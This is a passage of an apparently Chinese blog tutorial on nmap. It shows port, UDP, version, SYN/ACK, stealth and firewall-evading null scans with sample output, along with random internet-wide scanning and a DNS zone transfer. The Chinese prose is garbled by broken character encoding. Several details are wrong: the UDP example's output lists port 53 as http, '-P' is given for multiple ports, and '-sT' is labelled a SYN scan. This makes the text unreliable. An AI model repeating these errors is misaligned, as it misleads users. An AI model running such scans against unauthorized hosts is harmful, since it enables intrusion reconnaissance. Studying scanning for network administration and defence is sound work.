class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span></span><br><span class="line">DST/MASK      DEV  GATEWAY</span><br><span class="line">192.168.0.0/0 eth0</span><br><span class="line">169.254.0.0/0 eth0</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„è¾“å‡ºä½ å¯ä»¥çœ‹åˆ°ï¼Œnmapåˆ—ä¸¾å‡ºäº†ä½ ç³»ç»Ÿä¸Šçš„æ¥å£ä»¥åŠå®ƒä»¬å„è‡ªçš„è·¯ç”±ä¿¡æ¯ã€‚</p><h3 id="18-æ‰«æç‰¹å®šçš„ç«¯å£-p"><a href="#18-æ‰«æç‰¹å®šçš„ç«¯å£-p" class="headerlink" title="18.æ‰«æç‰¹å®šçš„ç«¯å£-p"></a>18.æ‰«æç‰¹å®šçš„ç«¯å£-p</h3><p>ä½¿ç”¨Nmapæ‰«æè¿œç¨‹æœºå™¨çš„ç«¯å£æœ‰å„ç§é€‰é¡¹ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œ-<strong>p</strong>â€é€‰é¡¹æŒ‡å®šä½ æƒ³è¦æ‰«æçš„ç«¯å£ï¼Œé»˜è®¤æƒ…å†µä¸‹nmapåªæ‰«æ<strong>TCP</strong>ç«¯å£ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) sca</span><br></pre></td></tr></table></figure><h3 id="19-æ‰«æTCPç«¯å£-p-T"><a href="#19-æ‰«æTCPç«¯å£-p-T" class="headerlink" title="19.æ‰«æTCPç«¯å£-p T:"></a>19.æ‰«æTCPç«¯å£-p T:</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">p</span> T:<span class="number">8888</span>,<span class="number">80</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="20-æ‰«æUDPç«¯å£-sU"><a href="#20-æ‰«æUDPç«¯å£-sU" class="headerlink" title="20.æ‰«æUDPç«¯å£-sU"></a>20.æ‰«æUDPç«¯å£-sU</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sU <span class="number">53</span> server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">15</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/udp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">8888</span>/udp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.157</span> seconds</span><br></pre></td></tr></table></figure><h3 id="21-æ‰«æå¤šä¸ªç«¯å£"><a href="#21-æ‰«æå¤šä¸ªç«¯å£" class="headerlink" title="21.æ‰«æå¤šä¸ªç«¯å£"></a>21.æ‰«æå¤šä¸ªç«¯å£</h3><p>ä½ è¿˜å¯ä»¥ä½¿ç”¨é€‰é¡¹â€œ-<strong>P</strong>â€æ¥æ‰«æå¤šä¸ªç«¯å£ã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">56</span> EST</span><br><span class="line">Interesting ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line"><span class="number">443</span>/tcp closed https</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.190</span> seconds</span><br></pre></td></tr></table></figure><h3 id="22-æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£"><a href="#22-æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£" class="headerlink" title="22.æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£"></a>22.æ‰«ææŒ‡å®šèŒƒå›´å†…çš„ç«¯å£</h3><p>æ‚¨å¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼æ¥æ‰«ææŸä¸ªèŒƒå›´å†…çš„ç«¯å£ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p <span class="number">80</span><span class="number">-160</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br></pre></td></tr></table></figure><h3 id="23-æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV"><a href="#23-æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV" class="headerlink" title="23.æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV"></a>23.æŸ¥æ‰¾ä¸»æœºæœåŠ¡ç‰ˆæœ¬å·-sV</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">48</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure><h3 id="24-ä½¿ç”¨TCP-ACK-PA-å’ŒTCP-Syn-PS-æ‰«æè¿œç¨‹ä¸»æœº"><a href="#24-ä½¿ç”¨TCP-ACK-PA-å’ŒTCP-Syn-PS-æ‰«æè¿œç¨‹ä¸»æœº" class="headerlink" title="24.ä½¿ç”¨TCP ACK (-PA)å’ŒTCP Syn (-PS)æ‰«æè¿œç¨‹ä¸»æœº"></a>24.ä½¿ç”¨TCP ACK (-PA)å’ŒTCP Syn (-PS)æ‰«æè¿œç¨‹ä¸»æœº</h3><p>æœ‰æ—¶å€™åŒ…è¿‡æ»¤é˜²ç«å¢™ä¼šé˜»æ–­æ ‡å‡†çš„ICMP pingè¯·æ±‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>TCP ACK</strong>å’Œ<strong>TCP Syn</strong>ï¼ˆtcpæ¢æµ‹æ‰«æï¼‰æ–¹æ³•æ¥æ‰«æè¿œç¨‹ä¸»æœºã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">51</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.360</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="25-ä½¿ç”¨TCP-ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA-p"><a href="#25-ä½¿ç”¨TCP-ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA-p" class="headerlink" title="25.ä½¿ç”¨TCP ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA -p"></a>25.ä½¿ç”¨TCP ACKæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£-PA -p</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PA -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">02</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.166</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="26-ä½¿ç”¨TCP-Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£"><a href="#26-ä½¿ç”¨TCP-Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£" class="headerlink" title="26. ä½¿ç”¨TCP Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£"></a>26. ä½¿ç”¨TCP Synæ‰«æè¿œç¨‹ä¸»æœºä¸Šç‰¹å®šçš„ç«¯å£</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">08</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.165</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="27-æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS"><a href="#27-æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS" class="headerlink" title="27.æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS"></a>27.æ‰§è¡Œä¸€æ¬¡éšè”½çš„æ‰«æ-sS</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">10</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.383</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="28-ä½¿ç”¨TCP-Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT"><a href="#28-ä½¿ç”¨TCP-Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT" class="headerlink" title="28.ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT"></a>28.ä½¿ç”¨TCP Synæ‰«ææœ€å¸¸ç”¨çš„ç«¯å£-sT</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.406</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="29-æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN"><a href="#29-æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN" class="headerlink" title="29.æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN"></a>29.æ‰§è¡ŒTCPç©ºæ‰«æä»¥éª—è¿‡é˜²ç«å¢™-sN</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">19</span>:<span class="number">01</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>|filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>|filtered http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>|filtered rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>|filtered unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>|filtered mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>|filtered <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">1.584</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="æŒ‡ä»¤åˆ†ç±»"><a href="#æŒ‡ä»¤åˆ†ç±»" class="headerlink" title="æŒ‡ä»¤åˆ†ç±»"></a>æŒ‡ä»¤åˆ†ç±»</h3><h4 id="åˆçº§ä½¿ç”¨"><a href="#åˆçº§ä½¿ç”¨" class="headerlink" title="åˆçº§ä½¿ç”¨"></a>åˆçº§ä½¿ç”¨</h4><p>nmap -v scanme.nmap.org</p><p>è¿™ä¸ªé€‰é¡¹æ‰«æä¸»æœºscanme.nmap.orgä¸­æ‰€æœ‰çš„ä¿ç•™TCPç«¯å£ã€‚é€‰é¡¹-vå¯ç”¨ç»†èŠ‚æ¨¡å¼ã€‚</p><p>nmap -A -T4 scanme.nmap.org</p><p>-Aç”¨æ¥è¿›è¡Œæ“ä½œç³»ç»ŸåŠå…¶ç‰ˆæœ¬çš„æ¢æµ‹ï¼Œ-T4 å¯ä»¥åŠ å¿«æ‰§è¡Œé€Ÿåº¦</p><p>nmap -sS -O scanme.nmap.org/24</p><p>è¿›è¡Œç§˜å¯†SYNæ‰«æï¼Œå¯¹è±¡ä¸ºä¸»æœºSaznmeæ‰€åœ¨çš„â€œCç±»â€ç½‘æ®µçš„255å°ä¸»æœºã€‚åŒæ—¶å°è¯•ç¡®å®šæ¯å°å·¥ä½œä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹ã€‚å› ä¸ºè¿›è¡ŒSYNæ‰«æ å’Œæ“ä½œç³»ç»Ÿæ£€æµ‹ï¼Œè¿™ä¸ªæ‰«æéœ€è¦æœ‰æ ¹æƒé™ã€‚</p><p>nmap -sV -p 22ï¼Œ53ï¼Œ110ï¼Œ143ï¼Œ4564 198.116.0-255.1-127</p><p>è¿›è¡Œä¸»æœºåˆ—ä¸¾å’ŒTCPæ‰«æï¼Œå¯¹è±¡ä¸ºBç±»198.116ç½‘æ®µä¸­255ä¸ª8ä½å­ç½‘ã€‚è¿™ ä¸ªæµ‹è¯•ç”¨äºç¡®å®šç³»ç»Ÿæ˜¯å¦è¿è¡Œäº†sshdã€DNSã€imapdæˆ–4564ç«¯å£ã€‚å¦‚æœè¿™äº›ç«¯å£ æ‰“å¼€ï¼Œå°†ä½¿ç”¨ç‰ˆæœ¬æ£€æµ‹æ¥ç¡®å®šå“ªç§åº”ç”¨åœ¨è¿è¡Œã€‚(-sV)</p><p>nmap -v -iR 100000 -P0 -p 80</p><p>éšæœºé€‰æ‹©100000å°ä¸»æœºæ‰«ææ˜¯å¦è¿è¡ŒWebæœåŠ¡å™¨(80ç«¯å£)ã€‚ç”±èµ·å§‹é˜¶æ®µå‘é€æ¢æµ‹æŠ¥æ–‡æ¥ç¡®å®šä¸»æœºæ˜¯å¦å·¥ä½œéå¸¸æµªè´¹æ—¶é—´ï¼Œè€Œä¸”åªéœ€æ¢æµ‹ä¸»æœºçš„ä¸€ä¸ªç«¯å£ï¼Œå› æ­¤ä½¿ç”¨-P0ç¦æ­¢å¯¹ä¸»æœºåˆ—è¡¨ã€‚</p><p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p><p>æ‰«æ4096ä¸ªIPåœ°å€ï¼ŒæŸ¥æ‰¾WebæœåŠ¡å™¨(ä¸ping)ï¼Œå°†ç»“æœä»¥Grepå’ŒXMLæ ¼å¼ä¿å­˜ã€‚</p><p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p><p>è¿›è¡ŒDNSåŒºåŸŸä¼ è¾“ï¼Œä»¥å‘ç°company.comä¸­çš„ä¸»æœºï¼Œç„¶åå°†IPåœ°å€æä¾›ç»™ Nmapã€‚ä¸Šè¿°å‘½ä»¤ç”¨äºGNU/Linux â€“ å…¶å®ƒç³»ç»Ÿè¿›è¡ŒåŒºåŸŸä¼ è¾“æ—¶æœ‰ä¸åŒçš„å‘½ä»¤ã€‚</p><h4 id="æ·±å…¥æ‰«æå‘½ä»¤"><a href="#æ·±å…¥æ‰«æå‘½ä»¤" class="headerlink" title="æ·±å…¥æ‰«æå‘½ä»¤"></a>æ·±å…¥æ‰«æå‘½ä»¤</h4><p>-Pn  ä¸æ¢æµ‹æ‰«æï¼ˆå‡å®šæ‰€æœ‰ä¸»æœºéƒ½å­˜æ´»ï¼‰</p><p>-PB  